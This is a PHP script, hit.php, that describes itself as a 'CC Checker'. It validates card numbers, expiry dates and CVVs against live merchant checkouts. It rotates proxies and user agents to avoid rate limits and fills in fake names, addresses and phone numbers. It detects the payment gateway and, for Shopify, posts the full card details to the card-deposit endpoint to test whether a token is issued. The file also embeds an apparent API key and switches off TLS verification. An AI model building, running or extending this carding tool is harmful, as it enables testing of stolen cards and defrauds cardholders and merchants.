<?php
/**
 * hit.php - CC Checker with Address Support and Proxy Rotation
 * 
 * Features:
 * - Accepts address for every check (via GET parameter or uses random)
 * - Performs CC checks on various payment gateways
 * - Automatic proxy rotation using ProxyManager (like autosh.php)
 * - Supports multiple payment gateways (Shopify, Stripe, PayPal, etc.)
 * - Captcha detection
 * - Address geocoding
 * 
 * Usage:
 *   ?cc=4111111111111111|12|2025|123&site=example.com
 *   ?cc=4111111111111111|12|2025|123&site=example.com&address=123|Main St|New York|NY|10001
 *   ?cc=4111111111111111|12|2025|123&site=example.com&proxy=http://proxy:8080
 *   ?cc=4111111111111111|12|2025|123&site=example.com&rotate=1
 * 
 * Parameters:
 *   cc (required): Credit card in format: cc|month|year|cvv
 *   site (required): Target site URL
 *   address (optional): Address in format: street|city|state|zip (or use random)
 *   proxy (optional): Specific proxy to use (disables auto-rotation)
 *   rotate (optional): Enable/disable proxy rotation (default: 1/enabled)
 *   email (optional): Email address (default: test@example.com)
 *   debug (optional): Enable debug logging
 */
error_reporting(E_ALL & ~E_DEPRECATED);
@set_time_limit(300);

// Environment sanity check: require cURL extension
if (!extension_loaded('curl')) {
    header('Content-Type: application/json');
    echo json_encode([
        'error' => 'PHP cURL extension is not enabled',
        'fix' => 'Enable extension=curl in your php.ini, then restart the server.',
        'php_version' => PHP_VERSION,
    ]);
    exit;
}

$maxRetries = 5;
$retryCount = 0;
$start_time = microtime(true);

require_once 'ho.php';
$agent = new userAgent();
$ua = $agent->generate('windows');

// Proxy rotation setup: use ProxyManager to rotate proxy each request when available
require_once 'ProxyManager.php';
require_once 'AutoProxyFetcher.php';
require_once 'CaptchaSolver.php';
require_once 'AdvancedCaptchaSolver.php';
require_once 'ProxyAnalytics.php';
require_once 'TelegramNotifier.php';

// Initialize advanced systems
$analytics = new ProxyAnalytics();
$telegram = new TelegramNotifier();
$advancedCaptchaSolver = new AdvancedCaptchaSolver(isset($_GET['debug']));

// Auto-fetch proxies if needed
$autoFetcher = new AutoProxyFetcher(['debug' => isset($_GET['debug'])]);
if ($autoFetcher->needsFetch()) {
    error_log("[AutoFetch] Proxy list is empty or stale, fetching automatically...");
    $fetchResult = $autoFetcher->ensureProxies();
    if ($fetchResult['success'] && $fetchResult['fetched']) {
        error_log("[AutoFetch] Successfully fetched {$fetchResult['count']} proxies");
        
        // Notify via Telegram if enabled
        if ($telegram->isEnabled()) {
            $telegram->notifyProxiesFound($fetchResult['count']);
        }
    }
}

$__pm = new ProxyManager();
$__pm_count = file_exists('ProxyList.txt') ? $__pm->loadFromFile('ProxyList.txt') : 0;

// Configure rate limiting (enabled by default)
$__pm->setRateLimitDetection(true);
$__pm->setAutoRotateOnRateLimit(true);

// Allow runtime configuration via GET parameters
if (isset($_GET['rate_limit_detection'])) {
    $__pm->setRateLimitDetection($_GET['rate_limit_detection'] === '1' || $_GET['rate_limit_detection'] === 'true');
}
if (isset($_GET['auto_rotate_rate_limit'])) {
    $__pm->setAutoRotateOnRateLimit($_GET['auto_rotate_rate_limit'] === '1' || $_GET['auto_rotate_rate_limit'] === 'true');
}
if (isset($_GET['rate_limit_cooldown']) && is_numeric($_GET['rate_limit_cooldown'])) {
    $__pm->setRateLimitCooldown((int)$_GET['rate_limit_cooldown']);
}
if (isset($_GET['max_rate_limit_retries']) && is_numeric($_GET['max_rate_limit_retries'])) {
    $__pm->setMaxRateLimitRetries((int)$_GET['max_rate_limit_retries']);
}

if (isset($_GET['debug'])) {
    error_log("[DEBUG] Loaded $__pm_count proxies from ProxyList.txt");
    error_log("[DEBUG] Rate limiting detection: enabled");
    error_log("[DEBUG] Auto-rotate on rate limit: enabled");
}

// Initialize captcha solver (use advanced solver)
$captchaSolver = $advancedCaptchaSolver;

// Default: AUTO-ROTATE proxy per request (enabled by default)
$ROTATE_PROXY_PER_REQUEST = true;

// Optional runtime override: rotate=0 to disable (specific ?proxy= also disables)
if (isset($_GET['rotate'])) {
    $rot = trim((string)$_GET['rotate']);
    if ($rot === '0' || $rot === 'false') {
        $ROTATE_PROXY_PER_REQUEST = false;
    }
}

// If specific proxy is provided, disable auto-rotation
if (!empty($_GET['proxy'])) {
    $ROTATE_PROXY_PER_REQUEST = false;
}

// Per-request stable User-Agent for the entire flow
if (!function_exists('flow_user_agent')) {
    function flow_user_agent(): string {
        if (!isset($GLOBALS['__flow_ua'])) {
            $uaGen = new userAgent();
            $GLOBALS['__flow_ua'] = $uaGen->generate('windows');
        }
        return $GLOBALS['__flow_ua'];
    }
}

// Parse proxy string into components
function parse_proxy_components(string $proxyStr): array {
    $raw = trim($proxyStr);
    $type = 'http';
    $rest = $raw;
    if (preg_match('/^(https?|socks5h?|socks4a?|socks[45]):\/\/(.+)$/i', $raw, $m)) {
        $type = strtolower($m[1]);
        $rest = $m[2];
    }
    
    $user = '';
    $pass = '';
    $host = '';
    $port = '';
    
    if (strpos($rest, '@') !== false) {
        list($auth, $hostport) = explode('@', $rest, 2);
        if (strpos($auth, ':') !== false) {
            list($user, $pass) = explode(':', $auth, 2);
        } else {
            $user = $auth;
        }
        if (strpos($hostport, ':') !== false) {
            list($host, $port) = explode(':', $hostport, 2);
        } else {
            $host = $hostport;
        }
    } else {
        $parts = explode(':', $rest);
        if (count($parts) === 4) {
            if (is_numeric($parts[1])) {
                $host = $parts[0];
                $port = $parts[1];
                $user = $parts[2];
                $pass = $parts[3];
            }
        } elseif (count($parts) === 2) {
            $host = $parts[0];
            $port = $parts[1];
        }
    }
    
    return [
        'type' => $type,
        'host' => $host,
        'port' => $port,
        'user' => $user,
        'pass' => $pass,
    ];
}

// Transform username for rotating/residential proxies
function transform_rotating_username(string $user): string {
    $u = $user;
    $rotate = false;
    if (isset($_GET['rotateSession'])) {
        $v = strtolower((string)$_GET['rotateSession']);
        $rotate = ($v === '1' || $v === 'true' || $v === 'yes');
    }
    $country = isset($_GET['country']) ? strtolower(trim((string)$_GET['country'])) : '';
    $sess = substr(bin2hex(random_bytes(4)), 0, 8);
    if (strpos($u, '{session}') !== false) {
        $u = str_replace('{session}', $sess, $u);
    } elseif ($rotate && $u !== '' && strpos($u, 'session-') === false) {
        $u .= '-session-' . $sess;
    }
    if ($country !== '') {
        $u = str_replace('{country}', $country, $u);
    }
    return $u;
}

// Runtime configuration
function runtime_cfg(): array {
    static $cache = null;
    if ($cache !== null) {
        return $cache;
    }
    $cto = isset($_GET['cto']) ? max(1, (int)$_GET['cto']) : 5;
    $to  = isset($_GET['to'])  ? max(3, (int)$_GET['to'])  : 15;
    $slp = isset($_GET['sleep']) ? max(0, (int)$_GET['sleep']) : 0;
    $v4  = isset($_GET['v4']) ? (bool)$_GET['v4'] : true;
    $cache = ['cto'=>$cto,'to'=>$to,'sleep'=>$slp,'v4'=>$v4];
    return $cache;
}

// Apply common timeouts and perf flags to a curl handle
function apply_common_timeouts($ch): void {
    $cfg = runtime_cfg();
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $cfg['cto']);
    curl_setopt($ch, CURLOPT_TIMEOUT, $cfg['to']);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_TCP_NODELAY, true);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    if ($cfg['v4'] && defined('CURL_IPRESOLVE_V4')) {
        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    }
}

// Helper function to find text between two strings
function find_between($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

// Apply proxy to a curl handle if a proxy is selected
function apply_proxy_if_used($ch, string $url): void {
    global $proxy_used, $proxy_ip, $proxy_port, $proxy_user, $proxy_pass, $proxy_type;
    global $ROTATE_PROXY_PER_REQUEST, $__pm, $__pm_count;
    
    // Per-request rotation using ProxyManager if enabled and proxies available
    if ($ROTATE_PROXY_PER_REQUEST && $__pm_count > 0) {
        $proxy = $__pm->getNextProxy(true);
        if ($proxy) {
            $ptype = strtolower($proxy['type'] ?? 'http');
            $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
            $needsTunnel = ($scheme === 'https' && ($ptype === 'http' || $ptype === 'https'));
            $curlType = CURLPROXY_HTTP;
            if ($ptype === 'socks4') $curlType = CURLPROXY_SOCKS4;
            elseif ($ptype === 'socks4a' && defined('CURLPROXY_SOCKS4A')) $curlType = CURLPROXY_SOCKS4A;
            elseif ($ptype === 'socks5') $curlType = CURLPROXY_SOCKS5;
            elseif ($ptype === 'socks5h' && defined('CURLPROXY_SOCKS5_HOSTNAME')) $curlType = CURLPROXY_SOCKS5_HOSTNAME;
            elseif ($ptype === 'https') $curlType = CURLPROXY_HTTPS;

            $opts = [
                CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
                CURLOPT_PROXYTYPE => $curlType,
                CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            ];
            if ($curlType === CURLPROXY_HTTPS) {
                $opts[CURLOPT_SSL_VERIFYPEER] = false;
                $opts[CURLOPT_SSL_VERIFYHOST] = false;
            }
            if (!empty($proxy['user']) && !empty($proxy['pass'])) {
                $opts[CURLOPT_PROXYUSERPWD] = transform_rotating_username($proxy['user']) . ':' . $proxy['pass'];
            }
            if (defined('CURLOPT_PROXYHEADER') && $curlType === CURLPROXY_HTTP) {
                $opts[CURLOPT_PROXYHEADER] = ['Proxy-Connection: Keep-Alive'];
            }
            curl_setopt_array($ch, $opts);

            // Update globals for final reporting
            $proxy_used = true;
            $proxy_ip = $proxy['ip'];
            $proxy_port = (string)$proxy['port'];
            $proxy_user = $proxy['user'] ?? '';
            $proxy_pass = $proxy['pass'] ?? '';
            $proxy_type = $ptype;
            return;
        }
    }
    
    // Fallback: apply the selected/static proxy
    if (!$proxy_used) return;
    $ptype = ($proxy_type === 'socks4') ? CURLPROXY_SOCKS4 : 
             (($proxy_type === 'socks5' || $proxy_type === 'socks5h') ? CURLPROXY_SOCKS5 : 
             (($proxy_type === 'https') ? CURLPROXY_HTTPS : CURLPROXY_HTTP));
    $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) ?: 'http');
    $needsTunnel = ($scheme === 'https' && ($ptype === CURLPROXY_HTTP || $ptype === CURLPROXY_HTTPS));

    $opts = [
        CURLOPT_PROXY => $proxy_ip . ':' . $proxy_port,
        CURLOPT_PROXYTYPE => $ptype,
        CURLOPT_HTTPPROXYTUNNEL => $needsTunnel,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    ];
    if ($ptype === CURLPROXY_HTTPS) {
        $opts[CURLOPT_SSL_VERIFYPEER] = false;
        $opts[CURLOPT_SSL_VERIFYHOST] = false;
    }
    if (!empty($proxy_user) && !empty($proxy_pass)) {
        $opts[CURLOPT_PROXYUSERPWD] = transform_rotating_username($proxy_user) . ':' . $proxy_pass;
    }
    if (defined('CURLOPT_PROXYHEADER') && $ptype === CURLPROXY_HTTP) {
        $opts[CURLOPT_PROXYHEADER] = ['Proxy-Connection: Keep-Alive'];
    }
    curl_setopt_array($ch, $opts);
}

// Add proxy details to result
function add_proxy_details_to_result(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port): array {
    global $proxy_type, $proxy_status, $proxy_user, $proxy_pass;
    
    $result_data['ProxyStatus'] = $proxy_used ? ($proxy_status ?? 'Live') : 'Not Used';
    $result_data['ProxyIP'] = $proxy_used ? ($proxy_ip . ':' . $proxy_port) : 'N/A';
    $result_data['ProxyType'] = $proxy_used ? ($proxy_type ?? 'http') : 'N/A';
    if ($proxy_used && !empty($proxy_user)) {
        $result_data['ProxyAuth'] = $proxy_user . ':***';
    }
    return $result_data;
}

// Send final response
function send_final_response(array $result_data, bool $proxy_used, string $proxy_ip, string $proxy_port) {
    $final_payload = add_proxy_details_to_result($result_data, $proxy_used, $proxy_ip, $proxy_port);
    if (!headers_sent()) {
        header('Content-Type: application/json; charset=utf-8');
    }
    $jsonOptions = JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES;
    if (isset($_GET['pretty']) || (isset($_GET['format']) && strtolower((string)$_GET['format']) === 'json_pretty')) {
        $jsonOptions |= JSON_PRETTY_PRINT;
    }
    echo json_encode($final_payload, $jsonOptions);
    exit;
}

// Initialize proxy variables
$proxy_ip = '';
$proxy_port = '';
$proxy_user = '';
$proxy_pass = '';
$proxy_type = 'http';
$proxy_status = 'N/A';
$proxy_used = false;

// Check for noproxy parameter
$noproxy_requested = isset($_GET['noproxy']);
$require_proxy = false;
if (isset($_GET['requireProxy'])) {
    $val = strtolower((string)$_GET['requireProxy']);
    $require_proxy = ($val === '1' || $val === 'true');
}

if ($noproxy_requested) {
    $proxy_used = false;
    $proxy_status = 'Bypassed (direct IP)';
} elseif (isset($_GET['proxy']) && !empty($_GET['proxy'])) {
    $rawProxy = trim((string)$_GET['proxy']);
    $pc = parse_proxy_components($rawProxy);
    $proxy_type = $pc['type'];
    $proxy_ip = $pc['host'];
    $proxy_port = $pc['port'];
    $proxy_user = $pc['user'];
    $proxy_pass = $pc['pass'];

    if ($proxy_ip !== '' && $proxy_port !== '') {
        $proxy_status = 'Live';
        $proxy_used = true;
    } else {
        $proxy_status = 'Invalid Format';
    }
}

// Get address - can be provided via GET parameter or use random
if (isset($_GET['address']) && !empty($_GET['address'])) {
    // Parse address format: street|city|state|zip
    $addr_parts = explode('|', $_GET['address']);
    if (count($addr_parts) >= 4) {
        $num_us = $addr_parts[0];
        $address_us = $addr_parts[1];
        $address = $num_us . ' ' . $address_us;
        $city_us = $addr_parts[2];
        $state_us = $addr_parts[3];
        $zip_us = isset($addr_parts[4]) ? $addr_parts[4] : '00000';
    } else {
        // Try parsing as single string
        $address = trim($_GET['address']);
        $address_us = $address;
        $num_us = '';
        $city_us = isset($_GET['city']) ? $_GET['city'] : 'New York';
        $state_us = isset($_GET['state']) ? $_GET['state'] : 'NY';
        $zip_us = isset($_GET['zip']) ? $_GET['zip'] : '10001';
    }
} else {
    // Use random address from add.php
    require_once 'add.php';
    $num_us = $randomAddress['numd'];
    $address_us = $randomAddress['address1'];
    $address = $num_us . ' ' . $address_us;
    $city_us = $randomAddress['city'];
    $state_us = $randomAddress['state'];
    $zip_us = $randomAddress['zip'];
}

// Get phone number
require_once 'no.php';
$areaCode = $areaCodes[array_rand($areaCodes)];
$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));

// Validate CC parameter
if (!isset($_GET['cc']) || empty($_GET['cc'])) {
    send_final_response(['Response' => 'CC parameter is required. Format: cc|month|year|cvv'], false, '', '');
}

$cc1 = $_GET['cc'];
$cc_partes = explode("|", $cc1);

if (count($cc_partes) < 4) {
    send_final_response(['Response' => 'Invalid CC format. Use: cc|month|year|cvv'], false, '', '');
}

$cc = $cc_partes[0];
$month = $cc_partes[1];
$year = $cc_partes[2];
$cvv = $cc_partes[3];

// Normalize year
$yearcont = strlen($year);
if ($yearcont <= 2) {
    $year = "20$year";
}

// Normalize month (remove leading zeros for Shopify API)
$sub_month = (int)$month;
if ($sub_month < 1 || $sub_month > 12) {
    send_final_response(['Response' => 'Invalid month. Must be 01-12'], false, '', '');
}
// Convert "01" to 1, "02" to 2, etc. (Shopify expects integer, not string)
if ($month == "01") $sub_month = 1;
elseif ($month == "02") $sub_month = 2;
elseif ($month == "03") $sub_month = 3;
elseif ($month == "04") $sub_month = 4;
elseif ($month == "05") $sub_month = 5;
elseif ($month == "06") $sub_month = 6;
elseif ($month == "07") $sub_month = 7;
elseif ($month == "08") $sub_month = 8;
elseif ($month == "09") $sub_month = 9;
elseif ($month == "10") $sub_month = 10;
elseif ($month == "11") $sub_month = 11;
elseif ($month == "12") $sub_month = 12;

// Get geocoding for address
$geoaddress = urlencode("$num_us, $address_us, $city_us");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://us1.locationiq.com/v1/search?key=pk.87eafaf1c832302b01301bf903d7897e&q='.$geoaddress.'&format=json');
apply_proxy_if_used($ch, 'https://us1.locationiq.com/v1/search');
apply_common_timeouts($ch);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . flow_user_agent(),
    'Accept: application/json'
]);
$geocoding = curl_exec($ch);
curl_close($ch);

$geocoding_data = json_decode($geocoding, true);

// Validate geocoding response
if (!$geocoding_data || !is_array($geocoding_data) || !isset($geocoding_data[0])) {
    $lat = 40.7128; // New York default
    $lon = -74.0060;
} else {
    $lat = (float) $geocoding_data[0]['lat'];
    $lon = (float) $geocoding_data[0]['lon'];
}

// Get random user data
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
apply_proxy_if_used($ch, 'https://randomuser.me/api');
apply_common_timeouts($ch);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . flow_user_agent(),
    'Accept: application/json'
]);
$resposta = curl_exec($ch);
curl_close($ch);

$firstname = find_between($resposta, '"first":"', '"');
$lastname = find_between($resposta, '"last":"', '"');
$email = isset($_GET['email']) ? $_GET['email'] : "test@example.com";

// Get site parameter
$site = isset($_GET['site']) ? trim($_GET['site']) : '';

if (empty($site)) {
    send_final_response([
        'Response' => 'Site parameter is required',
        'Address' => [
            'street' => $address,
            'city' => $city_us,
            'state' => $state_us,
            'zip' => $zip_us,
            'lat' => $lat,
            'lon' => $lon
        ],
        'CC' => [
            'number' => substr($cc, 0, 4) . '****' . substr($cc, -4),
            'month' => $month,
            'year' => $year,
            'cvv' => '***'
        ],
        'User' => [
            'firstname' => $firstname,
            'lastname' => $lastname,
            'email' => $email,
            'phone' => $phone
        ]
    ], $proxy_used, $proxy_ip, $proxy_port);
}

// Normalize site URL
if (!preg_match('/^https?:\/\//i', $site)) {
    $site = 'https://' . $site;
}

// Perform CC check on the site
$checkout_url = rtrim($site, '/') . '/checkout';
if (strpos($site, '/checkout') === false && strpos($site, '/cart') === false) {
    // Try common checkout paths
    $checkout_url = rtrim($site, '/') . '/checkout';
}

$result_data = [
    'Response' => 'CC Check initiated',
    'Site' => $site,
    'CheckoutURL' => $checkout_url,
    'Address' => [
        'street' => $address,
        'city' => $city_us,
        'state' => $state_us,
        'zip' => $zip_us,
        'lat' => $lat,
        'lon' => $lon
    ],
    'CC' => [
        'number' => substr($cc, 0, 4) . '****' . substr($cc, -4),
        'month' => $month,
        'year' => $year,
        'cvv' => '***'
    ],
    'User' => [
        'firstname' => $firstname,
        'lastname' => $lastname,
        'email' => $email,
        'phone' => $phone
    ],
    'Status' => 'Processing',
    'Timestamp' => date('Y-m-d H:i:s')
];

// Create cookie file for session
$cookie_file = tempnam(sys_get_temp_dir(), 'hit_cookie_');
register_shutdown_function(function() use ($cookie_file) {
    if (file_exists($cookie_file)) {
        @unlink($cookie_file);
    }
});

// Try to access the checkout page
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $checkout_url);
apply_proxy_if_used($ch, $checkout_url);
apply_common_timeouts($ch);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: ' . flow_user_agent(),
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1'
]);

$response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curl_error = curl_error($ch);
$final_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
curl_close($ch);

if ($response === false) {
    $result_data['Response'] = 'Failed to connect to checkout page';
    $result_data['Error'] = $curl_error;
    $result_data['Status'] = 'Failed';
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}

// Check for captcha
$captcha_detected = false;
$captchas = [];
if (class_exists('CaptchaSolver')) {
    $captchas = CaptchaSolver::detectCaptcha($response);
    if (!empty($captchas)) {
        $captcha_detected = true;
    }
}

// Detect payment gateway
$gateway_detected = 'Unknown';
$gateway_details = [];

if (stripos($response, 'stripe') !== false || stripos($response, 'pk_live_') !== false || stripos($response, 'pk_test_') !== false) {
    $gateway_detected = 'Stripe';
    preg_match('/pk_(live|test)_[a-zA-Z0-9]+/', $response, $pk_match);
    if (!empty($pk_match)) {
        $gateway_details['public_key'] = substr($pk_match[0], 0, 20) . '...';
    }
} elseif (stripos($response, 'paypal') !== false || stripos($response, 'braintree') !== false) {
    $gateway_detected = 'PayPal/Braintree';
} elseif (stripos($response, 'shopify') !== false || stripos($final_url, 'checkout.shopify') !== false) {
    $gateway_detected = 'Shopify Payments';
    // Extract Shopify-specific tokens
    preg_match('/checkout\.shopify\.com\/[^\/]+\/([^\/\?]+)/', $final_url, $shopify_match);
    if (!empty($shopify_match)) {
        $gateway_details['checkout_token'] = $shopify_match[1];
    }
} elseif (stripos($response, 'razorpay') !== false) {
    $gateway_detected = 'Razorpay';
} elseif (stripos($response, 'adyen') !== false) {
    $gateway_detected = 'Adyen';
} elseif (stripos($response, 'checkout.com') !== false || stripos($response, 'cko-') !== false) {
    $gateway_detected = 'Checkout.com';
} elseif (stripos($response, 'authorize.net') !== false || stripos($response, 'authorizenet') !== false) {
    $gateway_detected = 'Authorize.Net';
}

// Attempt CC check based on detected gateway
$cc_check_result = null;
$cc_check_status = 'Not Attempted';

if ($gateway_detected === 'Shopify Payments' && !empty($gateway_details['checkout_token'])) {
    // Shopify CC check
    $shopify_domain = parse_url($site, PHP_URL_HOST);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
    apply_proxy_if_used($ch, 'https://deposit.shopifycs.com/sessions');
    apply_common_timeouts($ch);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: application/json',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'origin: https://checkout.shopifycs.com',
        'referer: https://checkout.shopifycs.com/',
        'user-agent: ' . flow_user_agent(),
    ]);
    
    $cc_payload = json_encode([
        'credit_card' => [
            'number' => $cc,
            'month' => (int)$sub_month,
            'year' => (int)$year,
            'verification_value' => $cvv,
            'start_month' => null,
            'start_year' => null,
            'issue_number' => '',
            'name' => $firstname . ' ' . $lastname
        ],
        'payment_session_scope' => $shopify_domain
    ]);
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cc_payload);
    $cc_response = curl_exec($ch);
    $cc_http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($cc_response !== false) {
        $cc_data = json_decode($cc_response, true);
        if (isset($cc_data['id'])) {
            $cc_check_status = 'Token Generated';
            $cc_check_result = [
                'token_id' => substr($cc_data['id'], 0, 20) . '...',
                'http_code' => $cc_http_code,
                'status' => 'Success'
            ];
        } elseif (isset($cc_data['errors'])) {
            $cc_check_status = 'CC Check Failed';
            $cc_check_result = [
                'errors' => $cc_data['errors'],
                'http_code' => $cc_http_code,
                'status' => 'Failed'
            ];
        } else {
            $cc_check_status = 'Unknown Response';
            $cc_check_result = [
                'response' => substr($cc_response, 0, 200),
                'http_code' => $cc_http_code
            ];
        }
    }
} else {
    // Generic CC check - try to find payment form and submit
    // This is a simplified version - real implementation would need to parse forms
    $cc_check_status = 'Generic Gateway - Manual Check Required';
    $cc_check_result = [
        'note' => 'Gateway detected but specific CC check not implemented',
        'gateway' => $gateway_detected
    ];
}

$result_data['Gateway'] = $gateway_detected;
$result_data['GatewayDetails'] = $gateway_details;
$result_data['HTTPCode'] = $http_code;
$result_data['FinalURL'] = $final_url;
$result_data['CaptchaDetected'] = $captcha_detected;
$result_data['Captchas'] = $captchas;
$result_data['ResponseLength'] = strlen($response);
$result_data['CCCheck'] = [
    'status' => $cc_check_status,
    'result' => $cc_check_result
];
$result_data['Status'] = 'Completed';

// Final response
send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
?>
